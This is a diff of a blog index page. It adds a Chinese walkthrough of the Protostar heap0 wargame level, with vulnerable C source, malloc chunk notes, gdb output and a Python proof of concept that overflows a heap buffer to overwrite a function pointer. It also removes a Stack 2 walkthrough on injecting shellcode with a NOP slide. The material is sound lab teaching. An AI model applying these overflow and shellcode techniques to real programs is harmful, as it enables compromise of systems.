@@ -157,6 +157,128 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/">Protostar-堆溢出系列学习-heap 0</a>
+    </h1>
+  
+
+        
+        <a href="2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/" class="archive-article-date">
+  	<time datetime="2017-04-10T03:12:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。</p>
+<h2 id="0x01-heap0"><a href="#0x01-heap0" class="headerlink" title="0x01 heap0"></a>0x01 heap0</h2><p><code>C代码</code></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> data &#123;</div><div class="line">  <span class="keyword">char</span> name[<span class="number">64</span>];</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> fp &#123;</div><div class="line">  <span class="keyword">int</span> (*fp)();</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"level passed\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">nowinner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"level has not been passed\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">struct</span> data *d;</div><div class="line">  <span class="keyword">struct</span> fp *f;</div><div class="line"></div><div class="line">  d = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> data));</div><div class="line">  f = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> fp));</div><div class="line">  f-&gt;fp = nowinner;</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"data is at %p, fp is at %p\n"</span>, d, f);</div><div class="line"></div><div class="line">  <span class="built_in">strcpy</span>(d-&gt;name, argv[<span class="number">1</span>]);</div><div class="line">  </div><div class="line">  f-&gt;fp();</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="0x02-简单分析-amp-思考"><a href="#0x02-简单分析-amp-思考" class="headerlink" title="0x02 简单分析&amp;思考"></a>0x02 简单分析&amp;思考</h2><p>先在堆上分配了一个data和fp的结构体，然后使fp指向<code>nowinner</code>函数，然后打印对应分配的堆地址，以及将<code>argv[1]</code>复制到data结构体，最后调用<code>nowinner</code>函数。</p>
+<p>可以知道我们需要去执行<code>winner</code>函数，怎么做到呢？</p>
+<p>由于<code>strcpy</code>没对数据长度进行检查，那我们是否可以利用堆溢出将fp结构体里面的函数指针改为<code>winner</code>函数？Here we go！</p>
+<h2 id="0x03-malloc"><a href="#0x03-malloc" class="headerlink" title="0x03 malloc()"></a>0x03 malloc()</h2><p>在继续分析之前，我们先来简单的介绍一下<code>malloc</code>函数，在这里<code>malloc</code>函数更多是对<code>mmap</code>系统调用函数的一个封装，为什么要封装呢？也就是为什么不直接调用<code>mmap</code>来进行堆分配，原因是为了方便堆的管理，简单的理解可以把堆看做一个很大的内存块。</p>
+<p>那是如何管理堆的呢？见下</p>
+<table>
+<thead>
+<tr>
+<th>堆标志</th>
+<th>分配大小</th>
+<th>malloc返回地址addr</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>00000000</td>
+<td>00000011</td>
+<td>00000000 00000000</td>
+</tr>
+<tr>
+<td>00000000</td>
+<td>00000031</td>
+<td>AAAAAAAA BBBBBBBB</td>
+</tr>
+<tr>
+<td>CCCCCCCC</td>
+<td>DDDDDDDD</td>
+<td>EEEEEEEE FFFFFFFF</td>
+</tr>
+<tr>
+<td>…</td>
+<td>…</td>
+<td>…       …</td>
+</tr>
+<tr>
+<td>00000000</td>
+<td>00000011</td>
+<td>00000000 00000000</td>
+</tr>
+</tbody>
+</table>
+<p>每次分配的时候会额外分配16字节的管理开销，来表示所分配堆的信息。比如可以通过<code>addr-4</code>拿到自身的分配大小从而决定下次分配的选择</p>
+<p><strong>注：分配大小的第一位表示前面的内存块是否在使用</strong></p>
+<h2 id="0x04-调试-amp-hack"><a href="#0x04-调试-amp-hack" class="headerlink" title="0x04 调试&amp;hack"></a>0x04 调试&amp;hack</h2><p>通过前面的分析，我们的目的很明确，需要通过<code>strcpy(d-&gt;name, argv[1]);</code>去重写fp结构体里面的函数指针，使其为<code>winner</code>函数的地址。</p>
+<p>1.利用gdb查看strcpy前后堆的情况<br><img src="/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 0/0-0.png" alt="0-0"><br>我们看到AAAABBBBCCC…分配到了data堆上，如果我们输入更长的数据，就可以将fp的<code>nowinner</code>地址改为<code>winner</code>地址</p>
+<p>2.查看<code>winner</code>地址，重写fp函数指针</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) p winner </div><div class="line">$<span class="number">1</span> = &#123;<span class="keyword">void</span> (<span class="keyword">void</span>)&#125; <span class="number">0x8048464</span> &lt;winner&gt;</div></pre></td></tr></table></figure>
+<p>3.PoC Python脚本</p>
+<figure class="highlight golo"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">padding = <span class="string">"A"</span>*<span class="number">64</span> <span class="comment">#填充data</span></div><div class="line">head = <span class="string">"BBBB"</span>  <span class="comment"># not care</span></div><div class="line">head += <span class="string">"CCCC"</span> <span class="comment"># not care</span></div><div class="line">winner = <span class="keyword">struct</span>.pack(<span class="string">"I"</span>, <span class="number">0x8048464</span>) <span class="comment">#将nowinner地址改为winner地址</span></div><div class="line"><span class="keyword">print</span> padding+head+winner</div></pre></td></tr></table></figure>
+<p>4.hack<br><img src="/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 0/0-1.png" alt="0-1"><br>成功执行<code>winner</code>函数!</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Protostar</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">堆溢出</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="2017/04/10/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-mach-o动态链接/mach-o动态链接" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1242,6 +1364,7 @@
 </li>
 <li><p><a href="http://stackoverflow.com/questions/3401156/what-is-the-use-of-the-n-format-specifier-in-c" target="_blank" rel="external">What is the use of the %n format specifier in C?</a></p>
 </li>
+<li><a href="http://liveoverflow.com/binary_hacking/protostar/format1.html" target="_blank" rel="external">Protostar/Format 1</a></li>
 </ul>
 
       
@@ -1279,107 +1402,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-Protostar-栈溢出系列学习-Stack 2/Protostar-栈溢出系列学习-Stack 2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="2016/06/15/Protostar-栈溢出系列学习-Stack 2/Protostar-栈溢出系列学习-Stack 2/">Protostar-栈溢出系列学习-Stack 2</a>
-    </h1>
-  
-
-        
-        <a href="2016/06/15/Protostar-栈溢出系列学习-Stack 2/Protostar-栈溢出系列学习-Stack 2/" class="archive-article-date">
-  	<time datetime="2016-06-15T03:12:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-06-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>经过前面的学习，我们已经了解了简单的栈溢出利用手段，建议看本文章前先看下前面的分析。这次我们来做点有趣的事，我们引入shellcode。</p>
-<h2 id="0x01-Protostar-Stack-2"><a href="#0x01-Protostar-Stack-2" class="headerlink" title="0x01 Protostar / Stack 2"></a>0x01 Protostar / Stack 2</h2><p>Stack5 is a standard buffer overflow, this time introducing shellcode.</p>
-<p>This level is at /opt/protostar/bin/stack5</p>
-<p>Hints:<br>At this point in time, it might be easier to use someone elses shellcode<br>If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger<br>remove the int3s once your shellcode is done.</p>
-<p><code>stack2.c</code></p>
-<figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">64</span>];</div><div class="line"></div><div class="line">  gets(<span class="built_in">buffer</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="0x02-思路-amp-分析"><a href="#0x02-思路-amp-分析" class="headerlink" title="0x02 思路&amp;分析"></a>0x02 思路&amp;分析</h2><p>和前面的一样，我们可以通过覆盖返回地址然后由ret指令跳转到目标地址，但这次我们没有了win()函数，那我们应该跳转到哪里呢？没错，还是跳到栈上。要达到执行代码的目的，所以我们需要在栈上写入shellcode。Here we go！</p>
-<h2 id="0x03-调试-amp-hack"><a href="#0x03-调试-amp-hack" class="headerlink" title="0x03 调试&amp;hack"></a>0x03 调试&amp;hack</h2><ul>
-<li>对应汇编，我们在<code>0x080483da &lt;main+22&gt;:    ret</code>处下个断点</li>
-</ul>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble </div><div class="line">Dump of assembler code for function main:</div><div class="line"><span class="number">0x080483c4</span> &lt;main+<span class="number">0</span>&gt;:	<span class="keyword">push</span>   %ebp</div><div class="line"><span class="number">0x080483c5</span> &lt;main+<span class="number">1</span>&gt;:	<span class="keyword">mov</span>    %esp,%ebp</div><div class="line"><span class="number">0x080483c7</span> &lt;main+<span class="number">3</span>&gt;:	<span class="keyword">and</span>    <span class="number">$0</span>xfffffff0,%esp</div><div class="line"><span class="number">0x080483ca</span> &lt;main+<span class="number">6</span>&gt;:	<span class="keyword">sub</span>    <span class="number">$0</span>x50,%esp</div><div class="line"><span class="number">0x080483cd</span> &lt;main+<span class="number">9</span>&gt;:	<span class="keyword">lea</span>    <span class="number">0x10</span>(%esp),%eax</div><div class="line"><span class="number">0x080483d1</span> &lt;main+<span class="number">13</span>&gt;:	<span class="keyword">mov</span>    %eax,(%esp)</div><div class="line"><span class="number">0x080483d4</span> &lt;main+<span class="number">16</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x80482e8</span> &lt;gets@plt&gt;</div><div class="line"><span class="number">0x080483d9</span> &lt;main+<span class="number">21</span>&gt;:	<span class="keyword">leave</span>  </div><div class="line"><span class="number">0x080483da</span> &lt;main+<span class="number">22</span>&gt;:	<span class="keyword">ret</span></div></pre></td></tr></table></figure>
-<ul>
-<li><p>同样的方法，Python脚本测试返回地址</p>
-<p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-0.png?raw=true" alt="2-0"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-1.png?raw=true" alt="2-1"><br>可以发现<code>0xbffff79c</code>处正是返回地址，对应到TTTT,我需要在TTTT处写上我们要跳转的地址。</p>
-<p>既然题目中说了用<code>int 3 cc指令</code>那我们就先来测试下–[cc指令（见文章末尾）]<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-2.png?raw=true" alt="2-2"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-3.png?raw=true" alt="2-3"><br>我们成功执行了<code>cc INT 3指令</code>并触发 SIGTRAP</p>
-</li>
-<li><p>引入nop slide<br>为什么需要nop slide?<br>来看看这种情况，我们再启动一个终端去调试。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-4.png?raw=true" alt="2-4"><br>发现地址里面内容一样，但地址却不同，为什么会这样呢？再看看整个栈的情况<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-5.png?raw=true" alt="2-5"><br>可以发现，在圈中之后的栈地址都相同，但由于工作路径不同，导致前面的栈地址都发生了变化。<br>因此，我们需要引入nop slide去解决这种情况。</p>
-</li>
-<li><p>填写shellcode<br>自此，我们可以加入我们的shellcode了。这里我用的<a href="http://shell-storm.org/shellcode/files/shellcode-811.php" target="_blank" rel="external">这里</a>的shellcode。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-6.png?raw=true" alt="2-6"></p>
-</li>
-</ul>
-<p><strong>现在我们重新编写Python脚本，制作shellcode payload</strong></p>
-<p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-7.png?raw=true" alt="2-7"></p>
-<p>我们已经跳转的地址已经变化了40字节，并加入100的nopslide偏移，然后再执行shellcode</p>
-<ul>
-<li><p>运行测试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-8.png?raw=true" alt="2-8"><br>的确执行了dash，但并没有出现运行结果，这里很容易困惑。<br>不应该这样的啊？<br>经过思考，原来我们执行了<code>/bin/dash</code>后，并没有输入任何数据，所以就退出了。</p>
-<p>那怎么才能让执行后输入数据呢？<br>这里有一个小技巧，在执行后用<code>cat</code>指令，将输入转到输出<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-9.png?raw=true" alt="2-9"></p>
-</li>
-</ul>
-<h4 id="so-cool-make-it"><a href="#so-cool-make-it" class="headerlink" title="so cool! make it!"></a>so cool! make it!</h4><h2 id="0x04-附录"><a href="#0x04-附录" class="headerlink" title="0x04 附录"></a>0x04 附录</h2><p>INT 3 CC</p>
-<p>详细分分析可以看这边文章<a href="http://blog.csdn.net/trochiluses/article/details/20209593" target="_blank" rel="external">int 3中断与软件调试</a></p>
-<p>简单的理解就是:当我们调试程序时，可以在可能有问题的地方插入一条INT 3指令，使CPU执行到这一点时停下来。这便是软件调试中经常用到的断点（breakpoint）功能，因此INT 3指令又被称为断点指令。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Protostar</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">栈溢出</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="2016/06/15/Protostar-栈溢出系列学习-Stack 2/Protostar-栈溢出系列学习-Stack 2/">展开全文 >></a>
         </p>
       
 
@@ -1490,26 +1512,6 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Protostar</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">栈溢出</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">C++</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">vtable</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">cve</a>
               </li>
              
@@ -1527,6 +1529,30 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">mach</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">C++</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">vtable</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Protostar</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">堆溢出</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">栈溢出</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1550,18 +1576,6 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">gdb</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">调试</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">mach-o</a>
               </li>
              
@@ -1571,6 +1585,18 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">stub</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">gdb</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">调试</a>
               </li>
              
               <li class="article-tag-list-item">
